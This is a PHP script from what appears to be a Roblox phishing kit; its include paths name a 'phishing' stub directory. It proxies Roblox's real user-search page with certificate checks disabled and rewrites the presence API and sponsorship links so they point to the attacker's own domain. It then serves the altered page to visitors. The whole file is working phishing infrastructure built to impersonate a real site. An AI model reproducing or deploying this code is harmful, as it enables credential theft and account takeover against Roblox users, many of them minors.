<?php
//apislist
include("../../includes/functions.php");
$apicors = file_get_contents("../../stub/phishing/replaces/apis.txt");
$apicorswith = file_get_contents("../../stub/phishing/replaces/apis2.php");
$apicorswith = str_replace('"presenceApi": "https://presence.roblox.com",', '"presenceApi": "'.$domain.'/web",', $apicorswith);
//
$keyword = htmlspecialchars($_GET["keyword"]);
$keyword = str_replace(" ", "%20", $keyword);
$config['useragent'] = 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0';
$url = "https://www.roblox.com/search/users?keyword=$keyword";
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_USERAGENT, $config['useragent']);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$content = curl_exec($ch);
curl_close($ch);

$str =str_replace("$apicors",$apicorswith,$content );
$content = str_replace("https://www.roblox.com/user-sponsorship/1", "../../web/sponsorship.php?id=1", $str);
$content = str_replace("https://www.roblox.com/user-sponsorship/2", "../../web/sponsorship.php?id=2", $content);
$content = str_replace("https://www.roblox.com/user-sponsorship/3", "../../web/sponsorship.php?id=3", $content);
echo $content;
?>